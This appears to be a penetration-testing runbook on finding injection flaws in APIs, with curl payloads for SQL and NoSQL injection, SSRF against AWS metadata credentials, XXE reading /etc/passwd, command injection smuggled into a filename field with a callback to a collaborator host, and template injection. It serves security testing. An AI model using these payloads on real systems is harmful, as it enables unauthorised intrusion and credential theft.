# Runbook: Injection testing

APIs pass user-supplied input to databases, operating systems, template engines, XML parsers, and
internal HTTP requests. When that input is not properly validated or sanitised, the underlying
system executes it as a command. Injection vulnerabilities in APIs are often more severe than in
web applications because APIs are trusted more broadly, rate limits are weaker, and the responses
contain raw data rather than rendered HTML.

## Objective

Identify every parameter that passes user input to a backend system without adequate validation.
Confirm exploitability and determine the impact: data disclosure, data modification, or remote
code execution.

## Prerequisites

- Complete endpoint and parameter list from the discovery and schema runbooks.
- Burp Suite with Intruder and the active scanning module.
- SQLmap for automated SQL injection testing.
- ffuf for fuzzing parameter values.
- Payloads from SecLists.

## SQL injection

APIs backed by relational databases are as vulnerable to SQL injection as web applications.
The difference is the format: injection arrives in JSON or query string parameters rather than
HTML form fields.

### Detection

Test string parameters with minimal payloads that reveal whether input is being interpreted:

```bash
# Single quote: triggers a syntax error if concatenated into a SQL string
curl -s -X POST https://target.com/api/v1/search \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "test'"'"'"}'

# Boolean-based detection: same query, two values, different results indicate injection
curl -s https://target.com/api/v1/users?id=1%20AND%201=1
curl -s https://target.com/api/v1/users?id=1%20AND%201=2
```

A different response (different data, different status code, or a database error message) for
the `1=1` and `1=2` variants confirms boolean-based injection.

### Automated testing with SQLmap

SQLmap handles the full injection and extraction process. Capture a request in Burp Suite, save
it to a file, and pass it to SQLmap:

```bash
sqlmap -r request.txt --level=3 --risk=2 --batch
```

For JSON bodies, specify the parameter explicitly:

```bash
sqlmap -r request.txt -p "search_query" --dbms=mysql --batch
```

For REST-style URL parameters:

```bash
sqlmap -u "https://target.com/api/v1/users?id=1*" --batch
```

### NoSQL injection

APIs backed by MongoDB, Elasticsearch, or similar are vulnerable to NoSQL injection when
query operators are accepted in user input.

```bash
# MongoDB operator injection in JSON body
curl -s -X POST https://target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Operator injection in query string
curl -s "https://target.com/api/v1/users?role[$ne]=user"
```

A `200` response with user data confirms the operators were interpreted.

## Server-side request forgery (SSRF)

APIs that fetch URLs on the server side on behalf of the caller can be pointed at internal
infrastructure. Cloud-hosted APIs are particularly valuable targets because the instance metadata
service is reachable at a predictable internal address.

### Detection

Identify parameters that accept URLs, hostnames, or IP addresses:
- Image loading: `{"avatar_url": "https://..."}`
- Webhook registration: `{"callback_url": "https://..."}`
- Import from URL: `{"import_source": "https://..."}`
- Redirect targets: `?next=https://...`

Test with an out-of-band callback to confirm server-side fetching:

```bash
# Use a service like interact.sh or Burp Collaborator
curl -X POST https://target.com/api/v1/webhook \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://YOUR-COLLABORATOR-DOMAIN.oastify.com"}'
```

A callback to your collaborator domain confirms SSRF.

### Cloud metadata exploitation

On AWS EC2 instances, the metadata service is at `169.254.169.254`:

```bash
curl -X POST https://target.com/api/v1/fetch \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

A response containing the instance role name means the full credentials are retrievable by
appending the role name to the URL. This gives AWS credentials with whatever permissions the
EC2 instance role has.

## XML external entity injection (XXE)

APIs that process XML input are vulnerable to XXE if the XML parser is configured to process
external entity declarations.

### Detection

Inject a DOCTYPE declaration with an external entity reference:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request>
  <value>&xxe;</value>
</request>
```

Send this as the request body to any endpoint that accepts `Content-Type: application/xml` or
`text/xml`. If the response contains the contents of `/etc/passwd`, XXE is confirmed.

For blind XXE (no file contents in response), use an out-of-band callback:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "https://YOUR-COLLABORATOR-DOMAIN.oastify.com">]>
<request><value>&xxe;</value></request>
```

### SOAP services

SOAP services are XML-based by definition and historically have high rates of XXE vulnerability.
Test every SOAP operation with XXE payloads, particularly operations that accept string input
that is reflected in the response.

## Command injection

APIs that pass user input to shell commands or system calls are vulnerable to command injection.
This is most common in APIs that wrap command-line tools: file processing, image conversion,
archive extraction, network utilities.

### Detection

Inject command separators into parameters that might be passed to a shell:

```bash
# Semicolon, pipe, backtick, dollar sign
curl -s -X POST https://target.com/api/v1/convert \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "test.pdf; sleep 5 #"}'
```

A delay in the response time confirms command injection when using time-based payloads.

For out-of-band confirmation:

```bash
curl -s -X POST https://target.com/api/v1/convert \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "test.pdf; curl https://YOUR-COLLABORATOR.oastify.com #"}'
```

## Server-side template injection (SSTI)

APIs that use template engines to generate responses are vulnerable to SSTI when user input is
rendered inside a template without escaping.

### Detection

Mathematical expression payloads reveal whether expressions are evaluated:

```bash
# Test with expressions that different engines evaluate differently
curl -s https://target.com/api/v1/greet?name={{7*7}}
curl -s https://target.com/api/v1/greet?name=${7*7}
curl -s https://target.com/api/v1/greet?name=#{7*7}
```

A response containing `49` instead of the literal string confirms expression evaluation.
The specific syntax that works identifies the template engine, which determines the escalation
path to remote code execution.

## Output

- List of injectable parameters with injection type confirmed.
- SQLmap output for SQL injection findings, including database version and accessible tables.
- SSRF findings with the internal resources reachable and their content.
- XXE findings with the file contents or out-of-band callbacks received.
- Command injection findings with confirmed execution evidence.
- SSTI findings with template engine identified and exploitation path.

## Playbooks

- [REST API attack chain](../playbooks/rest-api.md)
